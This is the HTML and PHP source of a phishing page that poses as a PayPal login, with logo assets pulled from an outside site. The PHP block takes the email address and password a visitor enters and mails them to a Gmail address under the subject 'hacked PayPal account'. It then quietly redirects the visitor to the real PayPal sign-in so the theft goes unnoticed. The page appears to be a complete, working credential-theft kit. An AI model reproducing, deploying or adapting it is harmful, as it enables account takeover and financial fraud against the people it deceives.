<!DOCTYPE HTML>
<html>
<head>
<meta charset = 'UTF-8'>
<title>Log in to your PayPal account</title>
<link rel = 'icon' href = 'http://sioreport.fr/21.CHEN/cyber/paypal.ico' type = 'image/x-icon'>
<link rel = 'stylesheet' href = 'css/normalize.css'>
<link rel = 'stylesheet' href = 'main.css'>
</head>
<body>

<div id="global">
<img src='http://sioreport.fr/21.CHEN/cyber/paypal.png' width='700' height='400'>
<center><form action = 'index.php' method = 'POST'>

<input type = 'email' name = 'email' placeholder = "Email ou numéro de téléphone mobile"><br>
<input type = 'password' name = 'pass' placeholder = "Entrer votre mot de passe"><br>

<input class = 'log' type = 'submit' name='entrer' value = 'Se connecter'></center>

<?php

if (isset($_POST['entrer'])) {
$email = $_POST['email'];
$pass = $_POST['pass'];
///echo 'Votre message a bien été envoyé<br>';
///echo "Adresse mail = $email<br>";
///echo "mot de passe = $pass<br>";

mail('yepmtx@gmail.com', 'Compte paypal piraté', 'email = '.$email, 'mot de passe = '.$pass);
echo "<meta http-equiv='refresh' content='1; URL=https://www.paypal.com/signin/'>";
}
?>

</form>
</div>

</body>
</html>

</body>
</html>
